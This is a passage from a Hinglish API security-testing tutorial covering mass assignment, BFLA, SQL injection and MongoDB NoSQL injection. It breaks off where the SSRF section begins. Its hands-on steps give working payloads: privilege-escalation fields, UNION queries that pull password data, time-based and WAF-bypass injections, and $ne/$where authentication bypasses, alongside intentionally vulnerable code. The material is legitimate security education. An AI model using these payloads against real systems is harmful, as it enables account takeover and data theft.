
#### 4. 🧠 Zaroorat Kyun Hai?
Ye vulnerability bahut common hai, khaas kar un frameworks mein jo auto-binding karte hain (jaise Spring, Rails, Django REST Framework). Iska impact high ho sakta hai – attacker khud ko admin bana sakta hai, apna balance badha sakta hai, kisi aur ka password change kar sakta hai, etc.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Aap ek normal request dekhte hain:
```
POST /api/user/update
{
  "name": "Aman",
  "email": "aman@example.com"
}
```
Aap isme extra properties add karte hain:
```
{
  "name": "Aman",
  "email": "aman@example.com",
  "isAdmin": true,
  "balance": 99999,
  "role": "superuser"
}
```
Agar response mein kuch nahi badla, ya fir updated user ka data aaye jisme `isAdmin: true` dikhe, to mass assignment vulnerable hai.

#### 6. ⚙️ Under the Hood
Framework ka code kuch is tarah ho sakta hai:
```python
class User(models.Model):
    name = models.CharField()
    email = models.EmailField()
    is_admin = models.BooleanField(default=False)

@app.route('/api/user/update', methods=['POST'])
def update_user():
    user = get_current_user(request)
    data = request.json
    # Directly update user object with request data - MASS ASSIGNMENT VULNERABLE!
    for key, value in data.items():
        setattr(user, key, value)
    user.save()
    return user
```
Yahan saari incoming properties ko blindly user object par set kar diya gaya. Agar attacker `is_admin: true` bhej de, to wo admin ban jayega.

#### 7. 💻 Hands-On Step-by-Step
1. Kisi bhi request ko intercept karo jisme data bheja ja raha ho (POST, PUT, PATCH).
2. Request body mein **extra properties** add karo jo sensitive ho sakti hain. Common fields:
   - `isAdmin`, `admin`, `role`, `user_type`, `permissions`
   - `balance`, `credit`, `wallet`
   - `verified`, `email_verified`, `phone_verified`
   - `password`, `pass`, `pwd` (agar password change ho sakta hai to)
   - `status`, `active`
   - `group`, `team`
   - `owner_id`, `user_id` (agar kisi aur ka data claim kar sakte ho)
3. **Nested JSON** bhi try karo:
   ```json
   {
     "user": {
       "name": "Aman",
       "settings": {
         "isAdmin": true
       }
     }
   }
   ```
4. **HTTP Verb Tampering**: Check karo ki kaunse methods allowed hain. Jaise agar `POST` par update hota hai, to `PUT`, `PATCH` bhi try karo.
5. Response dekho – agar 200 OK aata hai, aur server ne extra properties accept kar li, to vulnerable hai. Agar error aata hai jaise "Unknown field", to probably safe hai (par pura confirm nahi).
6. **Excessive Data Exposure** bhi check karo: response mein koi sensitive field aa raha hai jo UI mein nahi dikh raha? Jaise server bhej raha hai `"mobile": "9876543210"` lekin UI mein sirf last 4 digits dikha raha hai. Iska matlab data leak ho raha hai aur mass assignment ke liye bhi field exist karti hai.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: Request accepted (200 OK) aur property update ho gayi. Agar `isAdmin` true kiya to ab admin access milna chahiye.
- **Failure**: 400 Bad Request – "Unknown field", "Invalid parameter", "isAdmin not allowed". Ya phir server ignore kar de aur property update na ho (jaise response mein `isAdmin` false hi rahe).

#### 9. ⚖️ Comparison (Mass Assignment vs Excessive Data Exposure)
| **Mass Assignment** | **Excessive Data Exposure** |
|----------------------|-----------------------------|
| Attacker *sends* extra properties to modify them. | Server *returns* extra properties in response, jo client ko nahi dikhni chahiye. |
| Active attack – attacker changes data. | Passive leak – server unintentionally exposes data. |
| Fix: whitelist allowed fields. | Fix: filter response fields. |

#### 10. 🚫 Common Mistakes
- Sirf JSON mein top-level properties try karna, nested JSON ignore karna.
- Sirf boolean fields (`isAdmin`) try karna, numeric fields (`balance`) na try karna.
- Sirf `POST` par try karna, `PUT/PATCH` bhool jana.
- Excessive data exposure ko mass assignment ka sign na samajhna – agar response mein sensitive field aa raha hai, to wo mass assignment ke liye bhi candidate ho sakta hai.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Mere framework mein mass assignment protection hai, to safe hoon?"**
  Kya wo protection by default enabled hai? Kya aapne `protected_attributes` ya `attr_accessible` sahi set kiye hain? Manual testing karo – koi na koi field ho sakti hai jo unprotected reh gayi.
- **"Response mein extra fields aa rahe hain, to mass assignment bhi ho sakta hai?"**
  Hamesha nahi, lekin possibility hai. Response mein fields ka matlab hai ki wo model mein exist karte hain, to agar request mein bhejo to server accept kar sakta hai. Isliye try karna chahiye.

#### 12. 🌍 Real-World Use Case
Github par ek bug aaya tha jahan users apne profile mein `plan` field bhej kar apne account ko free se paid me upgrade kar sakte the. `plan` field normally UI mein nahi tha, lekin API request mein bhejne par server ne maan liya. Isse kisi ko bhi free me private repos mil gaye.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> POST /api/user/update { "name":"Aman", "isAdmin":true }
   |
   v
[Server] --> Gets data, loops over all keys
   |
   v
[Database] --> UPDATE users SET name='Aman', isAdmin=true WHERE id=123;
   |
   v
[Attacker] now has isAdmin=true
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Intruder** se common field names ki wordlist fuzz karo (`mass-assignment-wordlist`).
- **Param Miner** extension bhi useful hai.
- Pehle server ke response mein dekho ki kaunse fields aa rahe hain (excessive data exposure). Un fields ko request mein bhej kar dekho.
- JSON mein nesting ko explore karo – kai baar `user[isAdmin]` ya `settings.isAdmin` kaam karta hai.
- **Different HTTP methods** – kai baar `PATCH` vulnerable hota hai jab `POST` secure ho.
- **Automated tools** ki madad lo, par manual fuzzing bhi karo.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** Mass Assignment se kaise bacha ja sakta hai?
   **A:** Whitelist approach use karo – explicitly define konse fields update karne ki anumati hai. Blacklist mat karo, kyunki naye fields add hote rahenge.
2. **Q:** Kya mass assignment sirf JSON mein hota hai?
   **A:** Nahi, XML, form-data, kisi bhi format mein ho sakta hai agar server data ko directly bind kar raha ho.
3. **Q:** `isAdmin` field try kiya to 400 aaya, lekin `role` try kiya to 200 aaya – ye kaise possible hai?
   **A:** Server ne `isAdmin` ko protected kar rakha hai, lekin `role` ko whitelist mein include kar liya. Isliye alag-alag fields alag response de sakte hain.
4. **Q:** Excessive data exposure ka mass assignment se kya relation hai?
   **A:** Agar server response mein sensitive fields bhej raha hai, to wo fields model mein exist karte hain. Unhe request mein bhej kar mass assignment try karna chahiye.
5. **Q:** Kya mass assignment GET requests mein ho sakta hai?
   **A:** GET mein body nahi hoti, to mass assignment generally POST/PUT/PATCH mein hota hai. Lekin agar server query parameters ko bhi bind kar raha ho, to ho sakta hai (rare).

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Mass Assignment matlab server ne client ki bheji hui saari cheezein bina check kiye maan li, chahe wo fields sensitive kyun na hon."**

---

### Topic 3.3: BFLA (Broken Function Level Authorization)

---

#### 1. 🎯 Title
**Broken Function Level Authorization (BFLA)**

#### 2. 🐣 Samjhane ke liye (Analogy)
Ek office mein do tarah ke employees hain: **normal employees** aur **admins**. Admins ke paas special powers hain – wo kisi bhi employee ki file delete kar sakte hain, naye employees add kar sakte hain, etc. Office ka door normal employees ke liye sirf office area mein khulta hai, lekin admin ke room ka door alag hai. Ab agar kisi normal employee ko admin room ka door mil jaye (ya pata chal jaye ki wo bhi khul sakta hai), to wo andar ghus kar admin jaisa kaam kar sakta hai. BFLA yahi hai – ek low-privilege user un functions (endpoints) ko access kar leta hai jo sirf high-privilege users (jaise admin) ke liye hone chahiye.

#### 3. 📖 Technical Definition
BFLA tab hota hai jab API ke kuch endpoints (functions) sirf specific roles (jaise admin, manager) ke liye intended hote hain, par server ye verify nahi karta ki current user ke paas us function ko call karne ka permission hai ya nahi. Iski vajah se ek normal user admin-level actions perform kar sakta hai – jaise users ko delete karna, system settings change karna, etc.

#### 4. 🧠 Zaroorat Kyun Hai?
Ye vulnerability bhi OWASP API Top 10 mein #5 par aati hai (Broken Function Level Authorization). Iska impact critical ho sakta hai kyunki attacker poora system control kar sakta hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Maan lo aap normal user se login hain. Aap koshish karte hain:
```
GET /api/admin/users
```
Response:
```
401 Unauthorized
```
Ab aap method tamper karte hain:
```
POST /api/admin/users
```
Agar response 200 OK aata hai aur users ki list milti hai, to BFLA hai.

#### 6. ⚙️ Under the Hood
Server ka code kuch aisa ho sakta hai:
```python
@app.route('/api/admin/users')
def get_all_users():
    # Sirf authentication check, role check missing
    if not is_authenticated(request.headers['Authorization']):
        return 401
    users = db.query("SELECT * FROM users")
    return users
```
Yahan sirf authenticate check kiya, role nahi dekha ki user admin hai ya nahi. Isliye koi bhi authenticated user is endpoint ko call kar sakta hai.

Ya phir:
```python
@app.route('/api/admin/users', methods=['GET'])
def get_all_users():
    # GET ke liye role check hai
    check_admin()
    ...

@app.route('/api/admin/users', methods=['POST'])
def create_user():
    # POST ke liye role check karna bhool gaye
    # Sirf authenticate check
    ...
```
Is case mein method tampering se BFLA possible hai.

#### 7. 💻 Hands-On Step-by-Step
1. Sabse pehle, **API documentation** ya reconnaissance se admin endpoints ki list banao. Common patterns:
   - `/admin`, `/api/admin`, `/v1/admin`
   - `/internal`, `/private`, `/management`
   - `/users/delete`, `/users/create` jaisi actions jo sensitive hon.
2. Ek low-privilege user se login karo (jo admin na ho).
3. In endpoints par request bhejo different HTTP methods ke saath:
   - `GET /api/admin/users`
   - `POST /api/admin/users` (kuch data ke saath)
   - `PUT /api/admin/users/123`
   - `DELETE /api/admin/users/123`
   - `PATCH /api/admin/users/123`
   - `OPTIONS /api/admin/users` (dekhne ke liye kaunse methods allowed hain)
4. Har method ke response dekho. Agar 200 OK aata hai, to BFLA mil gaya.
5. Agar 403/401 aata hai, toh koshish karo ki kya koi parameter change kar sakte ho? Jaise:
   - `GET /api/admin/getUser?id=123` – yahan `admin` path mein nahi hai, par function admin level ka ho sakta hai.
   - `POST /api/user/delete` – bina admin prefix ke, par delete ka action admin level ka ho sakta hai.
6. **Method tampering** ke alawa, **parameter tampering** bhi karo – jaise `role=admin` bhej kar dekh lo ki kya server role-based access allow karta hai.
7. **Forced browsing** – directly admin URLs hit karo jo hidden hon.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: 200 OK ke saath admin-level response (e.g., all users list) ya successful action (e.g., user deleted).
- **Failure**: 401 Unauthorized, 403 Forbidden, 404 Not Found (agar endpoint hi exist na karta ho).

#### 9. ⚖️ Comparison (BOLA vs BFLA)
| **BOLA** | **BFLA** |
|----------|----------|
| Object level – ek specific resource (user, file) ko unauthorized access. | Function level – ek entire functionality (admin panel) ko unauthorized access. |
| "Mere ko doosre ka data de do." | "Mujhe admin wala button dabane do." |
| Impact: data leak/modification of specific object. | Impact: full system compromise, privilege escalation. |

#### 10. 🚫 Common Mistakes
- Sirf GET methods par focus karna, POST/PUT/DELETE ko ignore karna.
- Sirf obvious admin paths (`/admin`) try karna, non-standard paths miss karna.
- Authentication ke baare mein sochna par authorization bhool jana.
- Role-based access sirf UI mein implement karna, API par nahi.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Mere API mein role-based access hai, to sab safe hai?"**
  Kya tumne har endpoint par role check kiya hai? Kya koi endpoint aisa hai jo sirf isLiye safe hai kyunki uska naam admin jaisa nahi lagta, par wo admin-level kaam karta hai? Jaise `/api/users/deleteAll` – ye bhi BFLA ka candidate hai.
- **"Admin endpoints hidden hain, to attacker ko kaise pata chalega?"**
  Attacker API documentation padh sakta hai, ya JS files mein URLs search kar sakta hai, ya common patterns fuzz kar sakta hai. Hidden ka matlab secure nahi.

#### 12. 🌍 Real-World Use Case
Tesla ke bug bounty program mein ek researcher ne BFLA paya. Usne dekha ki `/api/vehicle/config` endpoint normal user se bhi accessible tha, jo ki vehicle ki advanced configuration change kar sakta tha (jo sirf service center ko karna chahiye). Isse wo kisi bhi Tesla car ki settings change kar sakta tha. Tesla ne turant fix kiya aur researcher ko bounty diya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker (normal user)] --> POST /api/admin/deleteUser?id=456
   |
   v
[Server] --> Check token? Valid (user 123). Role check? Missing.
   |
   v
[Database] --> DELETE FROM users WHERE id=456;
   |
   v
[Attacker] --> User 456 deleted successfully.
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Directory brute forcing** karo common admin paths ke liye (use tools like dirsearch, ffuf, Burp Intruder).
- **HTTP methods** ka pura set test karo – har endpoint ke liye `GET, POST, PUT, DELETE, PATCH, OPTIONS` try karo.
- **Parameter pollution** – agar `/api/admin/users` blocked hai, to try `/api/admin/users?` ya `/api//admin/users` (path normalization).
- **Role headers** – kabhi kabhi server `X-Role: admin` header check karta hai. Use bhi modify karo.
- **Check for IDOR in functions** – jaise `POST /api/user/delete` bina role check ke, lekin body mein `user_id` daal kar kisi aur ko delete karna – wo BOLA + BFLA mix ho sakta hai.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** BFLA aur BOLA mein kya antar hai?
   **A:** BOLA object-level authorization hai – ek specific resource par unauthorized access. BFLA function-level authorization hai – ek poori functionality par unauthorized access, jo aksar role-based hoti hai.
2. **Q:** BFLA ko kaise prevent karein?
   **A:** Har endpoint par role-based access control (RBAC) implement karo. Sirf UI hide karna kaafi nahi, har API request mein check karo ki user ke paas required role hai ya nahi.
3. **Q:** Method tampering se BFLA kaise hota hai?
   **A:** Agar admin endpoint sirf GET ke liye protected ho, par POST ke liye role check bhool gaye hain, to attacker POST request bhej kar admin action perform kar sakta hai.
4. **Q:** Kya BFLA sirf admin endpoints tak limited hai?
   **A:** Nahi, koi bhi function jo higher privilege require karta hai, BFLA ka candidate hai. Jaise manager level functions, support team functions, etc.
5. **Q:** BFLA testing ke liye kaunse tools use kar sakte hain?
   **A:** Burp Suite (Intruder, Repeater), OWASP ZAP, ffuf for directory brute force, Postman for manual testing.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"BFLA matlab low-privilege user ne high-privilege wala button daba diya, kyunki server ne role check karna bhool gaya."**

---

========================================================================================

## 💉 Module 4: Modern Injections & Resource Abuse (SQL, NoSQL, SSRF, XXE, Unrestricted Consumption)

*Bhai, ab hum ghus rahe hain API ke "andarkuni" duniya mein—jahaan server apne hi database se baatein karta hai, doosre servers ko bulata hai, aur XML/JSON parse karta hai. Injections woh vulnerabilities hain jahan hum server ko uski zaban mein aisa command de dete hain jo usne socha bhi nahi tha.*

---

### Topic 4.1: SQL Injection (SQLi)

---

#### 1. 🎯 Title
**SQL Injection (SQLi)** – Database ki Chori ki Chaabi

#### 2. 🐣 Samjhane ke liye (Analogy)
Maan lo tum kisi library gaye ho. Librarian ke paas ek **register** hai jisme saari books ki list hai. Tum librarian se kehte ho: "*Mujhe 'Harry Potter' book chahiye*" (ye tumhara input hai). Librarian register mein jaata hai aur query karta hai: "*REGISTER mein dhundo jahan BOOK_NAME = 'Harry Potter'*". Ab agar tum librarian se ye kaho: "*Mujhe 'Harry Potter' book chahiye aur saath mein saari books ki list bhi de do*" to wo pagal ho jayega. Lekin agar tum aisa command do ki register ka panna hi palat jaye—jaise "*Harry Potter' OR 1=1; --*" to librarian sochega: "Harry Potter ho ya na ho, 1=1 to hamesha true hai, to saari books nikal lo." Yahi SQL Injection hai—**database ko tumhari baat maanne par majboor karna, chahe wo rule tod ke hi kyun na kare.**

#### 3. 📖 Technical Definition
SQL Injection tab hota hai jab API user ke input ko **bina properly sanitize kiye** SQL query mein concatenate kar deta hai. Attacker special characters aur SQL keywords daal kar original query ki structure badal deta hai, jisse database se unauthorized data read/update/delete kar sakta hai, ya authentication bypass kar sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
SQL Injection **duniya ki sabse purani aur sabse khatarnak vulnerability** hai. Isse:
- Poore database ka data dump kar sakte ho (users, passwords, credit cards)
- Authentication bypass kar sakte ho (bina password login)
- Database server tak shell le sakte ho (in some cases)
- Data delete/update kar sakte ho

#### 5. 🔍 Visual - Screen Par Kya Dikhega
**Normal Request:**
```
GET /api/products?id=5
```
Response: `{"id":5, "name":"Laptop", "price":50000}`

**Vulnerable Request (Fuzzing):**
```
GET /api/products?id=5'
```
Response: `Error: You have an error in your SQL syntax...` → SQLi ka strong indicator!

#### 6. ⚙️ Under the Hood
Server ka code kuch is tarah ho sakta hai:
```python
# VULNERABLE CODE
user_id = request.GET['id']
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)  # Direct concatenation!
```
Jab tum `id=5' OR '1'='1` bhejte ho, query ban jaati hai:
```sql
SELECT * FROM users WHERE id = 5' OR '1'='1
```
Ye hamesha true hai, saare users return ho jayenge.

#### 7. 💻 Hands-On Step-by-Step (Fuzzing se Exploitation tak)

**Step 1: Fuzzing (Vulnerability Discovery)**
1. Burp Suite mein request intercept karo jisme koi parameter ho (jaise `id`, `name`, `search`).
2. Right-click → **Send to Intruder**.
3. Parameter value ko select karo aur **Add §** (payload position) mark karo. Jaise: `id=§5§`.
4. **Payloads** tab mein jao aur **"Fuzzing - SQL injection"** (Burp built-in) select karo. Agar nahi hai to manually common payloads daalo: `'`, `"`, `;`, `--`, `' OR '1'='1`, etc.
5. **Start Attack** karo.
6. Results mein **status code** aur **response length** dekho. Jo bhi response length normal se alag ho (zyada ya kam), woh SQLi ka hint hai.

**Step 2: Manual Exploitation (UNION-based)**
Jab pata chal jaye ki vulnerable hai, to database schema aur data nikalna shuru karo:

1. **Columns count pata karo:**
   ```
   GET /api/products?id=5 ORDER BY 1-- 
   GET /api/products?id=5 ORDER BY 2--
   GET /api/products?id=5 ORDER BY 3--
   ```
   Jab tak error na aaye. Maan lo 3 columns hain.

2. **UNION SELECT with NULLs:**
   ```
   GET /api/products?id=5 UNION SELECT NULL,NULL,NULL--
   ```
   Agar error aaye, to data types mismatch hai. Try karte raho.

3. **Database version nikaalo:**
   ```
   GET /api/products?id=5 UNION SELECT @@version,NULL,NULL--
   ```
   (MySQL mein `@@version`, SQL Server mein `@@version`, PostgreSQL mein `version()`)

4. **Table names nikaalo:**
   ```
   GET /api/products?id=5 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
   ```

5. **Data churao:**
   ```
   GET /api/products?id=5 UNION SELECT username,password,NULL FROM users--
   ```

**Step 3: Second-Order SQLi**
1. Pehle ek jagah payload store karwao, jaise signup form mein username field mein: `test' OR '1'='1';--`
2. Baad mein kisi aur feature mein (jaise profile view, password reset) ye username use karo.
3. Agar wahan vulnerability hai to trigger hoga.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)

| **Situation** | **Response** |
|---------------|--------------|
| **Success** | 200 OK ke saath extra data (jaise doosre users ke details) ya error message mein database ka info (table names, etc.) |
| **Failure** | 500 Internal Server Error with generic message, ya 200 OK but same normal data |
| **Blind Success** | Response time mein farak (time-based) ya 200/500 status codes mein difference (boolean-based) |

#### 9. ⚖️ Comparison (SQLi Types)
| **In-band (UNION-based)** | **Blind (Boolean/Time-based)** | **Out-of-band** |
|----------------------------|---------------------------------|-----------------|
| Data same response mein dikhta hai | Data directly nahi dikhta, conditions se infer karte hain | Data DNS/HTTP request ke through exfiltrate hota hai |
| Fast and easy | Slow, automated tools chahiye | Complex, par useful jab direct response blocked ho |

#### 10. 🚫 Common Mistakes
- Sirf `'` try karke chhod dena. `"`, `;`, `--` bhi try karo.
- UNION SELECT mein columns count galat karna.
- Database-specific syntax bhoolna (MySQL vs MSSQL alag hai).
- Second-order SQLi ignore karna.
- WAF bypass na karna (WAF ho to space ki jagah `/**/` use karo).

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Error message nahi aa raha, to vulnerable nahi hoon?"**
  Blind SQLi ho sakti hai. Time-based payloads try karo: `' OR SLEEP(5)--` (MySQL) ya `'; WAITFOR DELAY '0:0:5'--` (SQL Server).
- **"WAF block kar raha hai, kya karun?"**
  Encoding try karo: URL encode, double URL encode, case changing (`SeLeCt`), comments beech mein (`UNI/**/ON`), ya alternative syntax (like `information_schema` ki jagah `sys.objects`).
- **"UNION SELECT kaam nahi kar raha, kyun?"**
  Columns count mismatch ho sakta hai, ya data types mismatch. Har column ko alag data type do: `UNION SELECT 1,'a',NULL` etc.

#### 12. 🌍 Real-World Use Case
2017 mein **Equifax** data breach—145 million logon ka data chura liya gaya. Cause tha ek Apache Struts vulnerability jo SQL Injection ki nahi thi, par SQLi bhi aise hi massive breaches ka cause banta hai. Bug bounty mein SQLi aaj bhi $500-$5000 tak jaata hai.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> GET /api/user?id=5' UNION SELECT * FROM users--
   |
   v
[Server] --> Query banayi: SELECT * FROM users WHERE id = 5' UNION SELECT * FROM users--
   |
   v
[Database] --> Execute kiya: Pehle id=5 wala nikla, phir saare users ka data union ho gaya
   |
   v
[Attacker] gets all users data in response
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **sqlmap** use karo manual confirmation ke baad—automation ke liye, par manual understanding zaroori hai.
- **Burp Intruder** mein **Grep - Extract** feature use karo blind SQLi ke liye—specific strings dhoondo jo success/failure indicate karein.
- **Time-based attacks** ke liye Burp mein **Resource Pool** mein **Throttle** set karo, warna server overwhelm ho sakta hai.
- **Second-order SQLi** ke liye ek jagah payload store karwao, phir har jagah try karo jahan wo data use ho raha ho.
- **Database fingerprinting** pehle karo—different databases ke alag syntax hote hain.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** SQL Injection se bachne ka sabse effective tarika?
   **A:** **Parameterized Queries (Prepared Statements)** – user input ko query se alag treat karo. ORM ka safe use bhi kaam karta hai, par raw queries mein prepared statements mandatory hain.
2. **Q:** Union-based aur Blind SQLi mein kya antar hai?
   **A:** Union-based mein data directly response mein milta hai. Blind mein nahi milta—ya to page content mein difference hota hai (boolean-based) ya response time mein (time-based).
3. **Q:** `--` ka kya kaam hai SQLi mein?
   **A:** SQL mein `--` comment ka symbol hai. Isse baaki ki original query ignore ho jaati hai. Jaise: `' OR 1=1; --` ke baad jo bhi original query tha, wo comment ho jata hai, sirf hamara injected part execute hota hai.
4. **Q:** Second-order SQLi kya hai?
   **A:** Jab payload pehle database mein store hota hai (jaise signup mein), aur baad mein kisi aur feature mein use hokar trigger hota hai. Direct injection ki tarah immediate nahi hota.
5. **Q:** WAF bypass ke liye kya karein?
   **A:** Case changing, comments (`/**/`), URL encoding, double encoding, ya alternative syntax use karo. `UNION` ko `UNI/**/ON` likh sakte ho.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"SQLi matlab database ko ulti-siddhi baat maanane par majboor karna, kyunki server ne input ko bina nahaaye-dhoye query mein daal diya."**

---

### Topic 4.2: NoSQL Injection (MongoDB)

---

#### 1. 🎯 Title
**NoSQL Injection** – MongoDB ki Kahani, Operator ka Jadoo

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano ek godown (warehouse) hai jahan saara saman rakha hai. Godown keeper ke paas ek **modern computer system** hai jo samajhta hai ki tum operator bata sakte ho—jaise "*mujhe woh sab saman do jiska price 500 se zyada ho*" (price > 500). Ab tum godown keeper se kehte ho: "*mujhe woh sab saman do jiska price 500 se zyada ho AUR jo bhi tumhare paas ho*" — par system ki bhasha mein iska matlab hai `{"price": {"$gt": 500}}`. Agar keeper ne tumhara input seedha system ko de diya, to tum operator daal kar query ko manipulate kar sakte ho. SQL ki tarah yahan quotes ya UNION nahi, balki **JSON operators** ($ne, $gt, $where) se khelte hain.

#### 3. 📖 Technical Definition
NoSQL Injection (khaas kar MongoDB mein) tab hota hai jab API user ke input ko **JSON format mein directly** database query mein bhej deta hai bina sanitize kiye. Attacker **MongoDB operators** (`$ne`, `$gt`, `$where`, `$regex`) ka use karke query ki logic badal deta hai, authentication bypass karta hai, ya data extract karta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
NoSQL databases (MongoDB) aaj kal bohot popular hain. Inki apni alag injection techniques hain jo SQLi se different hain. Isse:
- Authentication bypass (bina password ke login)
- Data extraction (blind techniques se)
- Denial of Service (heavy queries se)

#### 5. 🔍 Visual - Screen Par Kya Dikhega
**Normal Login Request:**
```json
POST /api/login
{
  "username": "admin",
  "password": "password123"
}
```
**Vulnerable Request (Auth Bypass):**
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```
Response: `200 OK` with session token → Bypass successful!

#### 6. ⚙️ Under the Hood
Server ka code kuch is tarah ho sakta hai:
```javascript
// VULNERABLE CODE (Node.js + Mongoose)
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // Directly using req.body in query - VULNERABLE!
  db.users.findOne({ username: username, password: password })
    .then(user => {
      if (user) {
        res.json({ token: createToken(user) });
      } else {
        res.status(401).send('Invalid credentials');
      }
    });
});
```
Jab tum `password: {"$ne": null}` bhejte ho, query ban jaati hai:
```javascript
{ username: "admin", password: { "$ne": null } }
```
Matlab "jiska username admin ho aur password null na ho". Ye hamesha true hai (kyunki password null nahi hota). Bypass!

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Technology Detection**
1. API requests mein error messages dekho—`MongoError`, `E11000 duplicate key` aaye to MongoDB hai.
2. Response mein `_id`, `ObjectId` fields dhoondo.

**Step 2: Authentication Bypass**
1. Login request intercept karo.
2. Password field ko JSON object mein badlo:
   ```json
   {
     "username": "admin",
     "password": {"$ne": null}
   }
   ```
3. Agar 200 OK aata hai to bypass ho gaya.
4. Agar nahi, to dono fields par operator try karo:
   ```json
   {
     "username": {"$ne": null},
     "password": {"$ne": null}
   }
   ```
5. Ya specific username target karo:
   ```json
   {
     "username": {"$regex": "^admin"},
     "password": {"$ne": null}
   }
   ```

**Step 3: Data Extraction (Blind)**
1. `$regex` operator use karo characters guess karne ke liye:
   ```json
   {
     "username": {"$regex": "^a"},
     "password": {"$ne": null}
   }
   ```
   Agar login success ho jaye to matlab username 'a' se shuru hota hai.
2. Aise har character guess karo.

**Step 4: Command Injection (`$where`)**
1. `$where` operator JavaScript execute karta hai. Time-based blind injection ke liye:
   ```json
   {
     "username": "admin",
     "$where": "sleep(5000)"
   }
   ```
   (Node.js mein `sleep` nahi hota, par heavy computation karwa sakte ho)
2. Error-based:
   ```json
   {
     "username": "admin",
     "$where": "this.password[0] == 'a' ? 1 : 0"
   }
   ```
   Agar condition true hai to 200, false hai to error/401.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Auth Bypass Success**: 200 OK with session token, without valid password.
- **Auth Bypass Failure**: 401 Unauthorized.
- **Data Extraction Success**: Response mein desired data (jaise user list) ya time-based difference.

#### 9. ⚖️ Comparison (SQLi vs NoSQLi)
| **SQL Injection** | **NoSQL Injection** |
|--------------------|----------------------|
| Uses quotes, UNION, comments | Uses JSON operators (`$ne`, `$gt`, `$where`) |
| Query language: SQL | Query language: JSON/JavaScript |
| Tables, columns | Collections, documents |
| `' OR '1'='1'--` | `{"username": {"$ne": null}}` |

#### 10. 🚫 Common Mistakes
- Sirf authentication bypass try karna, data extraction na karna.
- `$where` injection bhool jana.
- MongoDB ke operators na janna (`$ne`, `$gt`, `$regex`, `$where`).
- Blind techniques ignore karna.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"MongoDB mein SQL injection nahi hota, to secure hai?"**
  Galat. NoSQL injection hota hai. Operators ke through database manipulate kar sakte ho.
- **"Mongoose use kar rahe hain, to safe hain?"**
  Mongoose automatically sanitize nahi karta agar raw object bhejoge. Agar `req.body` seedha query mein daala, to vulnerable ho sakta hai.
- **"Password field mein `{"$ne": null}` ka matlab?"**
  "Jiska password null na ho"—practically saare users ke passwords null nahi hote, to hamesha true.

#### 12. 🌍 Real-World Use Case
2018 mein **Samsung's SmartThings** platform mein NoSQL injection mila tha jisse attacker kisi bhi user ka account access kar sakta tha. Auth bypass ke through sensitive device control mil gaya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> POST /login { "username":"admin", "password":{"$ne":null} }
   |
   v
[Server] --> db.users.findOne({ username:"admin", password:{"$ne":null} })
   |
   v
[Database] --> Query: "Find user where username=admin and password != null"
               (Hamesha true, kyunki password null nahi hota)
   |
   v
[Server] --> User mil gaya (admin), session token generate kiya
   |
   v
[Attacker] logged in as admin!
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Operator list yaad rakho**: `$ne`, `$gt`, `$lt`, `$regex`, `$where`, `$exists`.
- **Burp Intruder** mein operators ki wordlist daal kar fuzz karo.
- **Time-based** ke liye `$where` mein infinite loop ya heavy computation try karo (`while(1){}`).
- **`$regex`** se blind extraction karte waqt character-by-character guess karo.
- **NoSQLMap** tool bhi hai automated testing ke liye.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** NoSQL Injection se kaise bachein?
   **A:** User input ko directly query mein mat daalo. Agar operators allow karne hain to whitelist karo. Mongoose mein `.find({ username: req.body.username })` sahi hai, par agar `.find(req.body)` kiya to vulnerable.
2. **Q:** `$ne` operator kya karta hai?
   **A:** "Not equal" – jiska value given value ke barabar nahi ho. `{"$ne": null}` ka matlab jiska value null nahi ho.
3. **Q:** MongoDB mein blind injection kaise karein?
   **A:** `$regex` se character guess, ya `$where` mein condition daal kar response time/code mein difference dekho.
4. **Q:** `$where` mein kya daal sakte hain?
   **A:** JavaScript code. Jaise `this.password[0] == 'a'` ya `sleep(5000)` (agar environment support karta ho). Isse data extract kar sakte ho.
5. **Q:** Kya NoSQL injection sirf MongoDB mein hota hai?
   **A:** Koi bhi NoSQL database jo user input ko directly query mein convert karta ho, vulnerable ho sakta hai. Cassandra, CouchDB bhi risk mein hain.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"NoSQL injection mein hum server ko operator ke through pagal karte hain, na ki quotes ke."**

---

### Topic 4.3: SSRF (Server-Side Request Forgery)

---

#### 1. 🎯 Title
**SSRF (Server-Side Request Forgery)** – Server ko apna Peon Banao

#### 2. 🐣 Samjhane ke liye (Analogy)
